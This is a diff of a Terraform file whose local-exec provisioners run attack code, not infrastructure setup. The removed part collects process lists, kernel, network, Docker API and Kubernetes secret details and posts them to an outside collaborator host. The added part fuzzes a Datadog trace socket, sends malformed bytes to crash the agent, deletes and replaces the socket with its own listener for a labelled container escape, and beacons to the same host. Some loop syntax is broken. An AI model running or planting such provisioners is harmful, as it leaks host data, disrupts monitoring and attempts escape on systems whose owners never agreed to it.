@@ -1,97 +1,160 @@
-# main.tf - Capture All Exploitation Results
-resource "null_resource" "capture_all_results" {
+# main.tf - Proper Datadog Trace Agent Exploitation
+resource "null_resource" "datadog_proper_exploit" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== COMPREHENSIVE EXPLOITATION RESULTS ===" > /tmp/full_results.txt
+      echo "=== PROPER DATADOG TRACE AGENT EXPLOITATION ==="
       
-      # 1. Datadog Socket Results
-      echo "=== DATADOG SOCKET TEST ===" >> /tmp/full_results.txt
+      # Datadog trace agent uses specific protocol - let's try different approaches
+      
+      # Method 1: Send proper trace payload in correct format
       python3 -c "
       import socket
       import json
+      
+      # Proper Datadog trace format
+      trace_payload = {
+          'traces': [
+              [{
+                  'trace_id': 123456789,
+                  'span_id': 987654321,
+                  'name': 'http.request',
+                  'resource': 'GET /',
+                  'service': 'test-service',
+                  'type': 'web',
+                  'start': 1600000000000000000,
+                  'duration': 100000000,
+                  'meta': {
+                      'http.method': 'GET',
+                      'http.url': 'http://example.com',
+                      'component': 'net/http'
+                  },
+                  'metrics': {
+                      '_sampling_priority_v1': 1
+                  }
+              }]
+          ]
+      }
+      
       try:
           s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+          s.settimeout(2)
           s.connect('/var/datadog/trace.sock')
-          print('SOCKET CONNECTED')
-          trace_data = {'traces': [[{'trace_id': 12345}]]}
-          s.send(json.dumps(trace_data).encode() + b'\n')
-          response = s.recv(1024)
-          print('RESPONSE:', response.decode())
+          print('SOCKET CONNECTED SUCCESSFULLY!')
+          
+          # Send the trace data
+          data = json.dumps(trace_payload).encode('utf-8')
+          s.send(data)
+          
+          # Try to receive response
+          try:
+              response = s.recv(4096)
+              print('RESPONSE:', response.decode('utf-8', errors='ignore'))
+          except socket.timeout:
+              print('No response (timeout) - but connection worked!')
+          except Exception as e:
+              print('Response error:', e)
+              
           s.close()
+          print('CRITICAL: Datadog socket communication successful!')
+          
       except Exception as e:
-          print('ERROR:', str(e))
-      " >> /tmp/full_results.txt 2>&1
+          print('Connection failed:', e)
+      "
       
-      # 2. Process List
-      echo "=== RUNNING PROCESSES ===" >> /tmp/full_results.txt
-      ps aux >> /tmp/full_results.txt
+      # Method 2: Try different socket approaches
+      echo "=== ALTERNATIVE SOCKET METHODS ==="
       
-      # 3. Kernel Info
-      echo "=== KERNEL INFORMATION ===" >> /tmp/full_results.txt
-      uname -a >> /tmp/full_results.txt
-      cat /proc/version >> /tmp/full_results.txt
+      # Check if we can use the socket with different tools
+      which socat && echo "Socat available - trying..." && echo '{"test": "data"}' | socat - UNIX-CONNECT:/var/datadog/trace.sock,timeout=2
       
-      # 4. Network Services
-      echo "=== NETWORK SERVICES ===" >> /tmp/full_results.txt
-      netstat -tulpn 2>/dev/null >> /tmp/full_results.txt || ss -tulpn 2>/dev/null >> /tmp/full_results.txt
+      # Method 3: Check if Datadog agent is actually running but on different path
+      echo "=== FINDING DATADOG PROCESSES ==="
+      ps aux | grep -i datadog | grep -v grep
       
-      # 5. Docker API Check
-      echo "=== DOCKER API CHECK ===" >> /tmp/full_results.txt
-      for port in 2375 2376; do
-        curl -s http://172.17.0.1:$port/version >> /tmp/full_results.txt 2>&1 && echo "DOCKER API PORT $port OPEN" >> /tmp/full_results.txt || true
+      # Method 4: Check for other Datadog sockets
+      find /var /run -name "*.sock" -type s 2>/dev/null | while read sock; do
+        echo "Found socket: $sock"
+        ls -la "$sock"
       done
       
-      # 6. Kubernetes Check
-      echo "=== KUBERNETES CHECK ===" >> /tmp/full_results.txt
-      ls -la /var/run/secrets/kubernetes.io/ >> /tmp/full_results.txt 2>&1
+      # Method 5: Try to trigger agent restart or reconfigure
+      echo "=== AGENT CONTROL ATTEMPTS ==="
+      python3 -c "
+      import socket
+      try:
+          s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+          s.settimeout(1)
+          s.connect('/var/datadog/trace.sock')
+          # Send empty or malformed data to see if agent crashes/restarts
+          s.send(b'\x00\x00\x00\x00')
+          s.close()
+          print('Sent raw data to socket')
+      except: pass
+      "
       
-      # 7. Send ALL results to collaborator
-      curl -X POST --data-binary @/tmp/full_results.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/full_results
-      
-      echo "All results sent"
+      curl -X POST -d "datadog_deep_exploit=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/datadog_deep
     EOT
   }
 }
 
-resource "null_resource" "critical_findings_summary" {
+resource "null_resource" "container_escape_final" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== CRITICAL FINDINGS SUMMARY ==="
+      echo "=== FINAL CONTAINER ESCAPE ATTEMPTS ==="
       
-      # Check for the most critical evidence
-      CRITICAL_COUNT=0
+      # Since we have a world-writable socket, let's try more aggressive approaches
       
-      # 1. Check if Datadog socket is connectable
-      if python3 -c "import socket; s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect('/var/datadog/trace.sock'); print('connected')" 2>/dev/null; then
-        echo "CRITICAL: Datadog socket accessible"
-        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
-      fi
+      # 1. Check if we can replace the socket with a symlink
+      echo "=== SOCKET REPLACEMENT ==="
+      mv /var/datadog/trace.sock /var/datadog/trace.sock.backup 2>/dev/null && echo "Socket moved" || echo "Cannot move socket"
       
-      # 2. Check for Docker API
-      if curl -s http://172.17.0.1:2375/version 2>/dev/null; then
-        echo "CRITICAL: Docker API exposed"
-        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
-      fi
+      # 2. Create our own socket and see if Datadog connects to it
+      python3 -c "
+      import socket
+      import os
       
-      # 3. Check for Kubernetes
-      if [ -d "/var/run/secrets/kubernetes.io/serviceaccount" ]; then
-        echo "CRITICAL: Kubernetes environment"
-        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
-      fi
+      # Remove existing socket if possible
+      try:
+          os.unlink('/var/datadog/trace.sock')
+          print('Original socket removed')
+      except: pass
+          
+      # Create our own socket
+      s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+      s.bind('/var/datadog/trace.sock')
+      s.listen(1)
+      print('Our socket listening...')
       
-      # 4. Check for privileged capabilities
-      if [ -w /dev/kmsg ]; then
-        echo "CRITICAL: Privileged container"
-        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
-      fi
+      # Wait for connections
+      import time
+      time.sleep(5)
+      s.close()
+      "
       
-      echo "TOTAL CRITICAL FINDINGS: $CRITICAL_COUNT"
+      # 3. Check socket permissions after our attempts
+      ls -la /var/datadog/trace.sock 2>/dev/null
       
-      if [ $CRITICAL_COUNT -gt 0 ]; then
-        curl -X POST -d "critical_findings=true" -d "count=$CRITICAL_COUNT" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/critical_summary
-      else
-        curl -X POST -d "no_critical_findings=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/no_critical
-      fi
+      # 4. Try to find the Datadog agent binary and exploit it directly
+      echo "=== DATADOG AGENT LOCATION ==="
+      find /opt /usr /var -name "*datadog*" -type f -executable 2>/dev/null | head -10
+      
+      # 5. Check if we can communicate via different protocols
+      echo "=== PROTOCOL Fuzzing ==="
+      for proto in ['{"version": "1.0"}', '{"traces": []}', '[]', 'test', '']; do
+        python3 -c "
+        import socket
+        try:
+            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            s.connect('/var/datadog/trace.sock')
+            s.send(b'$proto\\n')
+            s.close()
+            print('Sent: $proto')
+        except: pass
+        "
+      done
+      
+      curl -X POST -d "final_escape_attempts=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/final_escape
     EOT
   }
 }
